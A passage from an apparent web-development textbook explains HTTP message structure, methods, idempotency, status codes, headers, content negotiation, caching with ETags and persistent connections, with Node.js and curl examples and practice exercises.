```bash
  | openssl s_client -quiet -connect example.com:443 -servername example.com
```

**Pseudo-headers in HTTP/2 and HTTP/3.** The request line is split into special headers that start with a colon, and all header names are lowercase:

```text
:method: POST
:scheme: https
:authority: shop.example.com
:path: /api/orders?notify=true
content-type: application/json
```

**Key Takeaways**

- Requests: request line (method, target, version), headers, empty line, optional body.
- Responses: status line (version, code, reason phrase), headers, empty line, optional body.
- `Host` is mandatory in HTTP/1.1; HTTP/2 and HTTP/3 use the `:authority` pseudo-header.
- Body boundaries are defined by `Content-Length` or `Transfer-Encoding: chunked`.
- HTTP/2 and HTTP/3 change the encoding, not the semantics: the same methods, headers and status codes apply.

> **Practice**
>
> 1. *(Beginner)* Write out, by hand, a complete HTTP/1.1 request that sends the form data `name=Ada&lang=en` to `/signup` on `forms.example.com`, including `Content-Type` and the correct `Content-Length`.
> 2. *(Intermediate)* Use `curl -v --http1.1` and `curl -v --http2` against the same HTTPS site and compare how the request is shown. Which parts of the request line became pseudo-headers?
> 3. *(Interview)* "What would go wrong if a server sent a response body that was longer than its `Content-Length` header on a keep-alive connection?" *Hint:* think about how the client finds the beginning of the *next* response on the same connection.

#### HTTP Methods and Their Semantics

The method (sometimes called the *verb*) tells the server what the client wants to do with the target resource. The path names *what*, the method says *how*. This separation is what lets caches, proxies, browsers and API tools reason about requests without understanding the application.

| Method | Purpose | Request body | Typical success response |
|---|---|---|---|
| `GET` | Retrieve a representation of the resource | Not used (no defined semantics) | `200 OK` with body |
| `HEAD` | Same as GET but without the response body | Not used | `200 OK`, headers only |
| `POST` | Submit data to be processed by the resource (create a child, run an action) | Yes | `201 Created` + `Location`, or `200`/`202`/`204` |
| `PUT` | Create or **replace** the resource at this URI with the enclosed representation | Yes (full representation) | `200 OK`, `204 No Content` or `201 Created` |
| `PATCH` | Apply a **partial** modification | Yes (a patch document) | `200 OK` or `204 No Content` |
| `DELETE` | Remove the resource | Usually not | `204 No Content`, `200 OK` or `202 Accepted` |
| `OPTIONS` | Ask which methods/features the resource supports (also used for CORS preflight, 5.4) | Usually not | `204` or `200` with `Allow` |
| `CONNECT` | Open a tunnel through a proxy (used for HTTPS via proxies) | No | `200` then raw bytes |
| `TRACE` | Echo the request back for diagnostics (usually disabled for security) | No | `200` with the request as body |

**GET and HEAD.** `GET /products/42` asks for the current state of product 42. `HEAD` is useful to check whether a resource exists, how large it is, or whether it changed, without downloading it:

```bash
curl -I https://example.com/video.mp4     # -I sends HEAD
# HTTP/2 200
# content-type: video/mp4
# content-length: 734003200               <- 700 MB: decide whether to download before doing it
# last-modified: Wed, 12 Aug 2026 18:02:11 GMT
```

**POST vs PUT.** The difference is who chooses the URI and what repeating the request does:

```http
POST /api/articles HTTP/1.1          <- "add this to the collection"; the server picks the new ID
Content-Type: application/json

{"title": "HTTP in depth"}

HTTP/1.1 201 Created
Location: /api/articles/381          <- the server tells you where it put it
```

```http
PUT /api/articles/381 HTTP/1.1       <- "the resource at this exact URI must now look like this"
Content-Type: application/json

{"title": "HTTP in depth", "status": "published", "tags": ["http"]}
```

**PUT vs PATCH.** `PUT` sends the *whole* new representation; missing fields are removed or reset. `PATCH` sends only a description of the changes. Two standard patch formats exist for JSON:

```http
PATCH /api/articles/381 HTTP/1.1
Content-Type: application/merge-patch+json

{"status": "archived", "tags": null}
```

```text
JSON Merge Patch (RFC 7396): send the fields to change; null deletes a field.

JSON Patch (RFC 6902): a list of operations, e.g.
  [ { "op": "replace", "path": "/status", "value": "archived" },
    { "op": "remove",  "path": "/tags" } ]
```

**HTML forms only know GET and POST.** A `<form method="put">` silently falls back to GET. Server frameworks therefore sometimes support a "method override" (a hidden `_method` field or an `X-HTTP-Method-Override` header); JavaScript clients using `fetch` can use any method directly.

```javascript
// fetch can send any method (Chapter 5.4)
await fetch('/api/articles/381', {
  method: 'PATCH',
  headers: { 'Content-Type': 'application/merge-patch+json' },
  body: JSON.stringify({ status: 'archived' }),
});
```

**Key Takeaways**

- The method expresses intent; generic software (caches, proxies, browsers, crawlers) relies on it.
- `GET` reads, `HEAD` reads headers only, `POST` processes/creates, `PUT` replaces, `PATCH` partially modifies, `DELETE` removes.
- With `POST` the server chooses the new resource's URI (returned in `Location`); with `PUT` the client names it.
- `PATCH` bodies need a patch format such as JSON Merge Patch or JSON Patch.
- HTML forms support only GET and POST; `fetch` supports all methods.

> **Practice**
>
> 1. *(Beginner)* For each action choose a method and URI: list all users, read user 7, create a user, change only user 7's email, delete user 7, replace user 7's whole profile.
> 2. *(Intermediate)* Write two `fetch` calls that change an article's title, one using `PUT` and one using JSON Merge Patch. Explain what happens to the article's `tags` field in each case if you omit it.
> 3. *(Interview)* "Why shouldn't a 'delete account' link be implemented as `GET /account/delete`?" *Hint:* think about link prefetchers, crawlers, browser history and what the method promises to intermediaries (see the next topic).

#### Safety, Idempotency and Side Effects

Methods carry *promises* about what they do. Browsers prefetch links, crawlers follow every URL, and network libraries retry failed requests automatically. They can only do this without harming you if they know which requests are harmless to send, or harmless to send twice.

**Safe methods** are read-only from the client's point of view: the client does not request any state change. `GET`, `HEAD`, `OPTIONS` and `TRACE` are safe. A server may still log the request or increment a view counter, but the client did not ask for that and cannot be held responsible for it.

**Idempotent methods** have the same *intended effect* on the server whether sent once or many times. All safe methods are idempotent, and so are `PUT` and `DELETE`:

```text
PUT /users/7  {"email": "a@x.io"}     sent 3 times -> user 7's email is a@x.io     (same final state)
DELETE /users/7                       sent 3 times -> user 7 does not exist         (same final state;
                                                      first response 204, later ones may be 404)
POST /orders  {"item": 42}            sent 3 times -> THREE orders                  (not idempotent)
PATCH /counter {"op": "increment"}    sent 3 times -> counter +3                    (not idempotent)
```

Idempotency is about the **server state**, not the response: a repeated `DELETE` may return `404` the second time and still be idempotent.

| Method | Safe | Idempotent | Cacheable by default |
|---|---|---|---|
| GET | Yes | Yes | Yes |
| HEAD | Yes | Yes | Yes |
| OPTIONS | Yes | Yes | No |
| TRACE | Yes | Yes | No |
| PUT | No | Yes | No |
| DELETE | No | Yes | No |
| POST | No | No | Only with explicit freshness info (rare) |
| PATCH | No | No (can be made idempotent) | No |

**Why this matters in practice.**

- **Automatic retries.** If a connection drops after a request was sent but before the response arrived, the client cannot know whether the server processed it. Clients and proxies may silently retry idempotent requests; they must not retry `POST`.
- **The browser's "Confirm Form Resubmission" dialog** appears when you reload a page that was the result of a `POST`, because resending it could create a second order.
- **Prefetching and crawling.** Search engine bots and link prefetchers issue `GET` freely. A "delete" behind a `GET` link will eventually be triggered by a bot.

**Post/Redirect/Get (PRG).** To avoid duplicate form submissions on reload, a server answers a successful `POST` with a `303 See Other` redirect to a `GET` page:

```text
Browser                                Server
  | POST /orders (form data)              |
  |-------------------------------------->|  creates order 9817
  | 303 See Other                         |
  | Location: /orders/9817                |
  |<--------------------------------------|
  | GET /orders/9817                      |
  |-------------------------------------->|
  | 200 OK (confirmation page)            |
  |<--------------------------------------|
  Reloading now repeats the harmless GET, not the POST.
```

**Making POST safe to retry: idempotency keys.** Payment APIs let the client send a unique key per logical operation; the server stores the result for that key and returns the same result if the request is repeated.

```javascript
// Client: generate one key per user action and reuse it on retries
const key = crypto.randomUUID();
async function placeOrder(order, attempt = 1) {
  try {
    return await fetch('/api/orders', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Idempotency-Key': key },
      body: JSON.stringify(order),
    });
  } catch (err) {                       // network failure: we do not know if the server got it
    if (attempt < 3) return placeOrder(order, attempt + 1); // same key -> no duplicate order
    throw err;
  }
}
```

```javascript
// Server (sketch, Express-style; see Chapter 12): remember results per key
const results = new Map(); // in production: Redis or a database table with a TTL

app.post('/api/orders', async (req, res) => {
  const key = req.get('Idempotency-Key');
  if (key && results.has(key)) {
    const { status, body } = results.get(key);
    return res.status(status).json(body);          // replay the original outcome
  }
  const order = await createOrder(req.body);
  const outcome = { status: 201, body: order };
  if (key) results.set(key, outcome);
  res.status(201).location(`/api/orders/${order.id}`).json(order);
});
```

**Key Takeaways**

- Safe methods (`GET`, `HEAD`, `OPTIONS`, `TRACE`) request no state change; idempotent methods (safe ones plus `PUT`, `DELETE`) can be repeated with the same effect.
- `POST` and `PATCH` are neither safe nor idempotent by default.
- Idempotency concerns server state, not identical responses.
- Never put state-changing actions behind `GET`; use Post/Redirect/Get for form submissions.
- Idempotency keys make `POST` safe to retry for critical operations such as payments.

> **Practice**
>
> 1. *(Beginner)* Classify as safe, idempotent-but-unsafe, or neither: `GET /search?q=http`, `PUT /profile/avatar`, `POST /comments`, `DELETE /sessions/current`, `PATCH /cart` with `{"add": 1}`.
> 2. *(Intermediate)* Implement the Post/Redirect/Get flow for a small contact form with Node's `http` module or Express, and verify that reloading the confirmation page does not resubmit the form.
> 3. *(Interview)* "A mobile client on a flaky network sometimes creates duplicate payments. How would you fix this end to end?" *Hint:* the client cannot know whether a timed-out request reached the server; design for retries with a key and server-side deduplication.

#### Status Codes and Their Classes

Every response starts with a three-digit status code. Clients, caches and crawlers act on it without reading the body: a `301` makes a search engine update its index, a `304` makes a browser use its cached copy, a `503` with `Retry-After` makes a client back off. The first digit defines the class.

| Class | Meaning | Who should act |
|---|---|---|
| `1xx` Informational | Interim response; the final one follows | Protocol layer |
| `2xx` Success | The request was received, understood and accepted | Client uses the result |
| `3xx` Redirection | Further action is needed, usually following `Location` | Client follows or uses cache |
| `4xx` Client error | The request is wrong; repeating it unchanged will fail again | Client must change the request |
| `5xx` Server error | The request may be valid but the server failed | Client may retry later |

**The codes you will meet most often.**

| Code | Name | Typical use |
|---|---|---|
| `100` | Continue | Server agrees to receive a large body sent with `Expect: 100-continue` |
| `101` | Switching Protocols | Accepting a protocol upgrade (WebSocket, 10.5) |
| `103` | Early Hints | Lets the browser preload CSS/JS while the server is still building the page |
| `200` | OK | Generic success with a body |
| `201` | Created | A new resource was created; its URI is in `Location` |
| `202` | Accepted | Queued for asynchronous processing; not done yet |
| `204` | No Content | Success, nothing to return (common for `DELETE` and `PUT`) |
| `206` | Partial Content | Response to a `Range` request (video seeking, resumable downloads) |
| `301` | Moved Permanently | Permanent redirect; clients may change `POST` to `GET` |
| `302` | Found | Temporary redirect; same method-change caveat as 301 |
| `303` | See Other | Redirect that is always followed with `GET` (Post/Redirect/Get) |
| `304` | Not Modified | Cached copy is still valid (conditional requests) |
| `307` | Temporary Redirect | Temporary, method and body preserved |
| `308` | Permanent Redirect | Permanent, method and body preserved |
| `400` | Bad Request | Malformed syntax, invalid JSON |
| `401` | Unauthorized | Missing or invalid authentication (must send `WWW-Authenticate`) |
| `403` | Forbidden | Authenticated (or not), but not allowed |
| `404` | Not Found | No such resource (also used to hide existence from unauthorised users) |
| `405` | Method Not Allowed | The resource exists but not for this method (must send `Allow`) |
| `409` | Conflict | Conflicts with current state (duplicate username, version conflict) |
| `410` | Gone | Deliberately and permanently removed |
| `412` | Precondition Failed | An `If-Match`/`If-Unmodified-Since` condition was false |
| `415` | Unsupported Media Type | The server cannot handle the request's `Content-Type` |
| `422` | Unprocessable Content | Syntax is fine but semantic validation failed |
| `429` | Too Many Requests | Rate limited (often with `Retry-After`) |
| `500` | Internal Server Error | Unhandled exception |
| `502` | Bad Gateway | A proxy got an invalid response from the upstream server |
| `503` | Service Unavailable | Overloaded or in maintenance (often with `Retry-After`) |
| `504` | Gateway Timeout | A proxy timed out waiting for the upstream server |

**Redirect choice.** The historical behaviour of `301` and `302` (browsers turning a redirected `POST` into a `GET`) caused confusion, so `307` and `308` were added with strict "same method, same body" semantics:

| | Method may change to GET | Method preserved |
|---|---|---|
| Temporary | `302` (and `303`, which always uses GET) | `307` |
| Permanent | `301` | `308` |

**401 vs 403.** `401 Unauthorized` really means *unauthenticated*: "I don't know who you are; authenticate and try again". `403 Forbidden` means "I know (or don't care) who you are, and the answer is no". Re-authenticating will not fix a `403`.

**Clients must handle unknown codes by class.** A client that receives an unrecognised `299` must treat it as `200`, an unknown `499` as `400`. This is how new codes (such as `103` or `425`) can be introduced without breaking old software.

```javascript
// Handling responses by class with fetch (fetch fulfils for all HTTP statuses, Chapter 5.4)
async function request(url, options) {
  const res = await fetch(url, options);
  if (res.status === 204) return null;                   // no body to parse
  if (res.ok) return res.json();                         // 200-299
  if (res.status === 401) throw new Error('Please log in again');
  if (res.status === 429 || res.status >= 500) {
    const retryAfter = Number(res.headers.get('Retry-After') ?? 1); // seconds (can also be a date)
    throw Object.assign(new Error('Temporary failure'), { retryAfter });
  }
  throw new Error(`Request failed with ${res.status}`);  // other 4xx: fix the request
}
```

**Key Takeaways**

- The first digit gives the class: 1xx informational, 2xx success, 3xx redirection, 4xx client error, 5xx server error.
- 4xx means "change the request"; 5xx means "the server failed, maybe retry later".
- Use `201` + `Location` for creation, `204` for empty success, `304` for cache validation, `422` for validation errors, `429` for rate limits.
- `401` means unauthenticated, `403` means forbidden.
- Prefer `307`/`308` when the method and body must be preserved across a redirect.

> **Practice**
>
> 1. *(Beginner)* Pick the most appropriate status code: a JSON body fails to parse; an email is already registered; a user requests another user's private invoice; a report has been queued for generation; the database is down.
> 2. *(Intermediate)* Use `curl -sI` to find the redirect chain from `http://github.com` to its final URL (`curl -sIL` follows redirects). Which codes are used, and why is each one appropriate?
> 3. *(Interview)* "When would you return 404 instead of 403 for a resource the user is not allowed to see?" *Hint:* consider what a 403 reveals about the existence of the resource.

#### Standard Request and Response Headers

Headers are the metadata of HTTP: they describe the body, the client's preferences, caching rules, authentication, connection handling and security policy. Their names are case-insensitive (`Content-Type` and `content-type` are the same header) and HTTP/2/3 transmit them in lowercase.

Headers fall into a few families depending on what they describe.

**Request headers** (sent by the client):

| Header | Example | Purpose |
|---|---|---|
| `Host` | `shop.example.com` | Target host (virtual hosting) |
| `User-Agent` | `Mozilla/5.0 ...` | Client software identification |
| `Accept` | `application/json, text/html;q=0.9` | Preferred response media types |
| `Accept-Language` | `it-IT, en;q=0.8` | Preferred languages |
| `Accept-Encoding` | `gzip, br, zstd` | Supported compression algorithms |
| `Authorization` | `Bearer eyJ...` | Credentials (10.3) |
| `Cookie` | `sid=abc123` | Cookies previously set by the server (10.2) |
| `Referer` | `https://shop.example.com/cart` | The page that linked to this request (spelled with one "r") |
| `Origin` | `https://app.example.com` | Origin of a cross-origin or POST request (CORS, CSRF checks) |
| `If-None-Match` | `"v42"` | Conditional request (caching) |
| `Range` | `bytes=0-1023` | Ask for part of a resource |

**Response headers** (sent by the server):

| Header | Example | Purpose |
|---|---|---|
| `Server` | `nginx` | Server software (often minimised for security) |
| `Location` | `/api/orders/9817` | Redirect target or URI of a created resource |
| `Set-Cookie` | `sid=abc123; HttpOnly; Secure` | Store a cookie in the client (10.2) |
| `WWW-Authenticate` | `Bearer realm="api"` | Authentication scheme required (sent with 401) |
| `Retry-After` | `120` | When to retry (with 429, 503) |
| `Allow` | `GET, HEAD, POST` | Supported methods (with 405, OPTIONS) |
| `ETag` | `"v42"` | Version identifier of the representation |
| `Cache-Control` | `max-age=3600` | Caching policy |
| `Vary` | `Accept-Encoding` | Which request headers affected this response |

**Representation headers** describe the body itself and can appear in both directions:

| Header | Example | Purpose |
|---|---|---|
| `Content-Type` | `application/json; charset=utf-8` | Media type of the body (Chapter 1.1) |
| `Content-Length` | `348` | Body size in bytes |
| `Content-Encoding` | `br` | Compression applied to the body |
| `Content-Language` | `it` | Natural language of the content |
| `Last-Modified` | `Sat, 03 Oct 2026 08:00:00 GMT` | When the resource last changed |

**Security headers** tell the browser to enable protections. They are covered in Chapter 17, but you will see them in every production response:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; img-src 'self' https://cdn.example.com
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
```

**Custom headers.** Applications can define their own headers. The old `X-` prefix convention (`X-Request-Id`) is discouraged for new standards but still common in practice. A typical use is a correlation ID that follows a request through several services:

```javascript
// Node.js http server: read a request header and set response headers (Chapter 11.6)
import { createServer } from 'node:http';
import { randomUUID } from 'node:crypto';

createServer((req, res) => {
  const requestId = req.headers['x-request-id'] ?? randomUUID(); // Node lowercases incoming names
  res.setHeader('X-Request-Id', requestId);                       // echo it for log correlation
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.end(JSON.stringify({ hello: req.headers['user-agent'] }));
}).listen(3000);
```

**Inspecting headers.** The Network panel in browser developer tools shows all request and response headers; on the command line use `curl -I` (response headers of a HEAD request) or `curl -v` (both directions).

**Key Takeaways**

- Header names are case-insensitive; HTTP/2 and HTTP/3 send them in lowercase.
- Request headers express client context and preferences; response headers describe the server's answer; representation headers describe the body.
- `Content-Type`, `Location`, `Set-Cookie`, `Authorization`, `Cache-Control` and `ETag` appear in almost every real application.
- Security headers such as HSTS and CSP turn on browser protections.
- Custom headers are allowed; use them for metadata like request IDs, not for data that belongs in the body.

> **Practice**
>
> 1. *(Beginner)* Open the Network panel on a news site, select the main document request and list five request headers and five response headers with a one-line explanation each.
> 2. *(Intermediate)* Extend the Node.js server above so that it returns `405 Method Not Allowed` with a correct `Allow` header for anything other than `GET` and `HEAD`.
> 3. *(Interview)* "What is the `Vary` header for, and what happens if a server forgets it when compressing responses?" *Hint:* think about a shared cache that stored a Brotli-compressed response and a client that only supports gzip.

#### Content Negotiation and Compression

The same resource can have several **representations**: JSON or XML, English or Italian, compressed with Brotli or gzip. **Content negotiation** is how the client says what it can handle and the server picks the best match, so one URI can serve many kinds of client.

**Proactive (server-driven) negotiation.** The client lists preferences in `Accept-*` headers, with optional *quality values* (`q`, from 0 to 1, default 1):

```http
GET /reports/2026-q3 HTTP/1.1
Host: api.example.com
Accept: application/json, text/csv;q=0.5, */*;q=0.1
Accept-Language: it-IT, it;q=0.9, en;q=0.7
Accept-Encoding: br, gzip
```

```text
Accept:            JSON preferred (q=1), CSV acceptable (0.5), anything else as last resort (0.1)
Accept-Language:   Italian (Italy), then any Italian, then English
Accept-Encoding:   Brotli or gzip compression understood
```

The server answers with the representation it chose and declares the choice:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Language: it
Content-Encoding: br
Vary: Accept, Accept-Language, Accept-Encoding
```

If nothing acceptable exists, the server may return `406 Not Acceptable`, though most servers simply send a default representation. Similarly, if the *request* body's `Content-Type` is not supported, the answer is `415 Unsupported Media Type`.

| Request header | Negotiates | Response header |
|---|---|---|
| `Accept` | Media type | `Content-Type` |
| `Accept-Language` | Human language | `Content-Language` |
| `Accept-Encoding` | Compression | `Content-Encoding` |

**`Vary` is mandatory for correct caching.** A cache stores responses by URL. If the response depends on `Accept-Language`, the cache must also key on that header, otherwise an Italian user could be served the English page cached for someone else. `Vary` lists the request headers that influenced the response.

**Reactive negotiation.** Instead of guessing, the server can return `300 Multiple Choices` or a page with links to alternatives (`/report.json`, `/report.csv`) and let the client choose. In practice language choice is often reactive: the server suggests a language based on `Accept-Language`, but the user can switch via an explicit URL such as `/it/` or `/en/`, which is also better for search engines.

**Compression.** Text formats (HTML, CSS, JavaScript, JSON, SVG) compress very well, often by 70-90%. Compression is negotiated with `Accept-Encoding` / `Content-Encoding`:

| Encoding | Notes |
|---|---|
| `gzip` | Universally supported, fast, good ratio |
| `br` (Brotli) | 15-25% smaller than gzip for text; supported by all modern browsers over HTTPS |
| `zstd` (Zstandard) | Very fast compression and decompression with Brotli-like ratios; supported in current Chromium and Firefox |
| `deflate` | Legacy, inconsistent implementations; avoid |
| `identity` | No compression |

```javascript
// Node.js: compress a JSON response with Brotli if the client accepts it, else gzip
import { createServer } from 'node:http';
import { brotliCompressSync, gzipSync } from 'node:zlib';

createServer((req, res) => {
  const body = JSON.stringify({ items: Array.from({ length: 500 }, (_, i) => ({ id: i, name: `Item ${i}` })) });
  const accepted = req.headers['accept-encoding'] ?? '';
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Vary', 'Accept-Encoding');               // response varies by this request header

  if (/\bbr\b/.test(accepted)) {
    res.setHeader('Content-Encoding', 'br');
    return res.end(brotliCompressSync(body));            // sync is fine for a demo; stream in production
  }
  if (/\bgzip\b/.test(accepted)) {
    res.setHeader('Content-Encoding', 'gzip');
    return res.end(gzipSync(body));
  }
  res.end(body);                                          // identity
}).listen(3000);
```

In production, compression is usually done by a reverse proxy or CDN, and static assets are **pre-compressed** at build time (`app.js.br`, `app.js.gz`) so no CPU is spent per request.

**What not to compress.** JPEG, PNG, WebP, MP4, ZIP and WOFF2 files are already compressed; compressing them again wastes CPU and can make them slightly larger. Very small responses (under about 1 KB) gain little. Compressing responses that mix secrets with attacker-controlled input over HTTPS can leak those secrets through response sizes (the BREACH attack), so CSRF tokens and similar secrets should be masked or kept out of compressed, reflective pages.

**Key Takeaways**

- Content negotiation picks a representation using `Accept`, `Accept-Language` and `Accept-Encoding`, weighted with `q` values.
- The server reports its choice in `Content-Type`, `Content-Language` and `Content-Encoding`, and lists the deciding headers in `Vary`.
- `406` means no acceptable representation; `415` means the request body's format is unsupported.
- Brotli, gzip and Zstandard dramatically shrink text responses; do not recompress media or archives.
- Compression belongs in the reverse proxy, CDN or build step whenever possible.

> **Practice**
>
> 1. *(Beginner)* Compare `curl -s https://example.com | wc -c` with `curl -s -H 'Accept-Encoding: br' https://example.com | wc -c`. Why is the second number smaller, and why is its output unreadable?
> 2. *(Intermediate)* Write a handler for `GET /report` that returns JSON or CSV depending on the `Accept` header (respecting `q` values), with a correct `Vary` header and `406` when neither is acceptable.
> 3. *(Interview)* "Should a REST API select the response language from `Accept-Language` or from a URL parameter?" *Hint:* weigh caching, shareable links, search engines and user override against automatic detection.

#### Caching, ETags and Conditional Requests

The fastest request is the one never sent. HTTP caching lets browsers, proxies and CDNs store responses and reuse them, cutting latency, bandwidth and server load. Getting it right is a balance between **freshness** (users see current data) and **efficiency** (nothing is downloaded twice).

**Where caches live.**

```text
  Browser                 Shared caches                         Origin server
 +--------------+       +----------------+   +------------+    +-------------+
 | private      | <---> | corporate      |<->| CDN edge   |<-->| app server  |
 | cache (per   |       | proxy cache    |   | (shared)   |    | (source of  |
 | user)        |       | (shared)       |   |            |    |  truth)     |
 +--------------+       +----------------+   +------------+    +-------------+
  "private" responses      "public"/shared responses may be stored here
  may only be stored here
```

**Freshness with `Cache-Control`.** A response is *fresh* for a period during which a cache may reuse it without asking the server. After that it is *stale* and must be revalidated.

| Directive | Meaning |
|---|---|
| `max-age=N` | Fresh for N seconds |
| `s-maxage=N` | Overrides `max-age` for shared caches (CDNs, proxies) |
| `public` | Any cache may store it, even if the request had `Authorization` |
| `private` | Only the browser's private cache may store it (user-specific data) |
| `no-cache` | May be stored, but must be **revalidated** before every reuse |
| `no-store` | Must not be stored anywhere (sensitive data) |
| `must-revalidate` | Once stale, must not be used without successful revalidation |
| `immutable` | Will never change during its freshness lifetime; do not revalidate even on reload |
| `stale-while-revalidate=N` | May serve stale for N seconds while refreshing in the background |
| `stale-if-error=N` | May serve stale for N seconds if the origin errors |

The name `no-cache` is famously misleading: it does *not* mean "don't cache", it means "always check first". Use `no-store` to forbid storage.

**Typical policies.**

```http
# Fingerprinted static asset (app.3f9a1c.js): the name changes when content changes
Cache-Control: public, max-age=31536000, immutable

# HTML page: always check, but allow the 304 shortcut
Cache-Control: no-cache

# Personal account data
Cache-Control: private, no-cache

# Bank statement, one-time tokens
Cache-Control: no-store

# Public API listing, OK to be up to a minute old, served instantly while refreshing
Cache-Control: public, max-age=60, stale-while-revalidate=300
```

**Validation with ETags.** When a cached response is stale, the cache does not have to download it again. It asks "has it changed since this version?" using a **conditional request**. An `ETag` (entity tag) is an opaque version identifier chosen by the server, often a hash of the content:

```text
1st request                                      Later (after max-age expired)
-----------                                      -----------------------------
GET /api/products/42                             GET /api/products/42
                                                 If-None-Match: "a7f3c9"
200 OK                                           
ETag: "a7f3c9"                                   304 Not Modified          <- no body: tiny response
Cache-Control: max-age=60                        ETag: "a7f3c9"
{ ...4 KB of JSON... }                           Cache-Control: max-age=60
                                                 (cache reuses its stored body, now fresh again)
```

`Last-Modified` / `If-Modified-Since` work the same way with timestamps, but have only one-second resolution; ETags are more precise. **Weak ETags** (`W/"a7f3c9"`) signal semantic equivalence rather than byte-for-byte identity, for example the same data with different whitespace or compression.

```javascript
// Node.js: ETag-based revalidation
import { createServer } from 'node:http';
import { createHash } from 'node:crypto';

createServer((req, res) => {
  const body = JSON.stringify({ id: 42, name: 'Keyboard', price: 79 });
  const etag = `"${createHash('sha1').update(body).digest('base64url')}"`; // version = content hash

  res.setHeader('ETag', etag);
  res.setHeader('Cache-Control', 'no-cache');             // always revalidate

  if (req.headers['if-none-match'] === etag) {            // client already has this version
    res.statusCode = 304;
    return res.end();                                     // no body
  }
  res.setHeader('Content-Type', 'application/json');
  res.end(body);
}).listen(3000);
```

**Conditional writes: optimistic concurrency.** The same mechanism prevents lost updates when two users edit the same resource. The client sends the version it based its change on; the server rejects the write if the resource has changed meanwhile:

```http
PUT /api/articles/381 HTTP/1.1
If-Match: "v7"
Content-Type: application/json

{"title": "Updated title", ...}
```

```text
Server: current ETag is "v8" (someone else saved first)
  -> 412 Precondition Failed: client must reload, merge, and retry
Server: current ETag is "v7"
  -> 200 OK, ETag: "v8"
```

**Cache busting.** Long `max-age` values are only safe when the URL changes whenever the content changes. Bundlers (Vite, webpack) put a content hash in file names (`app.3f9a1c.js`), and the HTML, which is revalidated on every load, references the new name after each deployment.

**Key Takeaways**

- Caches exist in the browser (private) and in proxies/CDNs (shared); `private` and `public` control which may store a response.
- `max-age` defines freshness; `no-cache` means revalidate every time; `no-store` means never store.
- ETags with `If-None-Match` let caches revalidate cheaply with `304 Not Modified`.
- `If-Match` with `412 Precondition Failed` implements optimistic concurrency for updates.
- Fingerprinted asset names plus `max-age=31536000, immutable` give perfect caching for static files.

> **Practice**
>
> 1. *(Beginner)* Write the `Cache-Control` header for: a company logo with a hashed file name, a user's inbox page, a password-reset page, and a public weather API that updates every five minutes.
> 2. *(Intermediate)* Run the ETag server above and use `curl -i` twice, the second time with `-H 'If-None-Match: "<etag>"'`. Then add `If-Match` support to a `PUT` handler that returns `412` for stale versions.
> 3. *(Interview)* "After a deployment some users still see the old version of the site for hours. What is likely wrong?" *Hint:* look at the `Cache-Control` of the HTML document versus the JavaScript bundles, and at whether asset names are fingerprinted.

#### Persistent Connections and Pipelining

Opening a connection is expensive: a TCP handshake costs one round trip, and TLS adds one or two more before the first byte of HTTP is sent. On a mobile network with 100 ms round trips, that is 200-300 ms of pure setup. Reusing connections is one of the oldest and most effective HTTP optimisations.

**HTTP/1.0: one request per connection.** Every image, stylesheet and script required a new TCP connection:

```text
HTTP/1.0 (no keep-alive)              HTTP/1.1 persistent connection
-------------------------             -------------------------------
SYN/ACK  GET /       close            SYN/ACK  GET /       GET /a.css   GET /b.js   ...
SYN/ACK  GET /a.css  close                     <- 200      <- 200       <- 200
SYN/ACK  GET /b.js   close            one handshake, many sequential requests
three handshakes, three slow starts
```

**HTTP/1.1: persistent by default.** Connections stay open after a response unless one side sends `Connection: close`. Servers close idle connections after a timeout (often 5-75 seconds) and may advertise their policy with `Keep-Alive: timeout=5, max=100`. Besides saving handshakes, a reused connection has already "warmed up" TCP's congestion window, so it transfers data faster.

**Head-of-line blocking.** On a single HTTP/1.1 connection, requests are still answered one at a time: the second response cannot start until the first is complete. A slow response blocks everything behind it, just like a slow customer at the front of a single checkout queue.

**Pipelining: a failed fix.** HTTP/1.1 allowed clients to send several requests without waiting for the responses, but required the server to answer **in order**:

```text
Client sends:   GET /slow-report   GET /logo.png   GET /style.css     (all at once)
Server must reply: [ slow-report ......... ][ logo ][ style ]
                   the fast responses wait behind the slow one
```

Because of head-of-line blocking, buggy proxies and the impossibility of safely retrying a broken pipeline of non-idempotent requests, pipelining was never enabled by default in browsers. Today it is effectively dead.

**The browser workaround: parallel connections.** Browsers open up to **six connections per host** for HTTP/1.1. Web developers once pushed further with tricks that are now anti-patterns under HTTP/2:

| HTTP/1.1-era technique | Purpose | Status with HTTP/2+ |
|---|---|---|
| Domain sharding (`img1.example.com`, `img2.`) | More than 6 parallel connections | Harmful: defeats multiplexing, extra handshakes |
| Concatenating all JS/CSS into one file | Fewer requests | Partly obsolete: bundling still helps for other reasons, but granular files cache better |
| CSS sprites | One image request instead of many | Rarely needed |
| Inlining small assets as data URIs | Avoid requests | Use sparingly: prevents separate caching |

**Connection reuse in your own code.** Server-to-server HTTP clients should also reuse connections. In Node.js, `fetch` (built on undici) and the `http` module's global agent keep connections alive by default:

```javascript
// Node.js 18+: fetch reuses keep-alive connections to the same origin automatically
for (let i = 0; i < 100; i++) {
  await fetch(`https://api.example.com/items/${i}`); // one TCP+TLS handshake, then reuse
}

// With the http module, use an Agent to control pooling explicitly
import https from 'node:https';
const agent = new https.Agent({ keepAlive: true, maxSockets: 10 }); // up to 10 sockets per host
https.get('https://api.example.com/items/1', { agent }, (res) => res.resume());
```

**Key Takeaways**

- Connection setup (TCP plus TLS) costs several round trips, so reusing connections matters.
- HTTP/1.1 connections are persistent by default; `Connection: close` ends them.
- A single HTTP/1.1 connection processes requests sequentially, causing head-of-line blocking.
- Pipelining tried to fix this but kept in-order responses and was never deployed by browsers.
- Browsers open about six connections per host for HTTP/1.1; HTTP/2 multiplexing replaces this and makes domain sharding harmful.

> **Practice**
>
> 1. *(Beginner)* Run `curl -v https://example.com https://example.com/` (two URLs in one command) and find the line that shows the second request reusing the connection.
> 2. *(Intermediate)* Throttle the network to "Slow 4G" in DevTools, load a page with many images over HTTP/1.1 and over HTTP/2 (most CDNs support both), and compare the waterfall charts.
> 3. *(Interview)* "Why did pipelining fail while HTTP/2 multiplexing succeeded, even though both send multiple requests on one connection?" *Hint:* compare response ordering and how each response is identified.

#### HTTP/1.1, HTTP/2 and HTTP/3

